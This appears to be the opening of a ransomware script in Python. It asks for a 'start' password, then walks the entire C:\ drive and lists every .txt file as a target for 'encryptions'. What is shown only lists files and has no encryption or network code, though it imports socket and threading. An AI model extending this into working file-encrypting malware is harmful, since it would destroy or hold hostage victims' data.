import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

safeguard = input("add safeguard to run the code ")
if safeguard != "start":
    quit()

encryptions = (".txt")

# gets all files in the C directory

filepaths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        filepath, fileext = os.path.splitext(root + '\\' + file)
        if fileext in encryptions:
            print(file)
